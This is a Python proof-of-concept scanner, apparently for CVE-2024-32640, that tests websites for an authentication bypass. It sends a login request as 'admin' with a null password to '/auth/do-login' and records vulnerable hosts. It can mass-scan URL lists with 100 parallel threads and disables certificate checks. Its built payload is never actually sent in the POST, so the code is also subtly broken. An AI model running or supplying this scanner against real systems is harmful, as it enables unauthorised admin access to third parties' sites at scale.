import requests,argparse,sys,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def poc(target):
    headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6", "If-None-Match": "W/\"2c7f97fe47e677a36b345916e53a8ae081a30317\"", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
    url_payload = '/auth/do-login'
    data = {"args": "{\"type\":2,\"username\":\"admin\",\"password\":null,\"captcha\":\"ykex\",\"oath\":\"\",\"remember\":false}"}
    url = target+url_payload
    res1 = requests.get(target,verify=False)
    if res1.status_code == 200:
        res2 = requests.post(url=url,headers=headers,verify=False)
        js = json.loads(res2.text)
        if js['code']==0:
            print(f'[+]{target}存在任意用户登录')
            with open('result.txt','a') as f:
                f.write(target+'\n')
        else:
            print(f'[-]{target}不存在任意用户登录')
    else:
        print(f'[-]{target}可能存在问题，请手工测试')
        
def main():

    parser = argparse.ArgumentParser(description="CVE-2024-32640_poc")
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()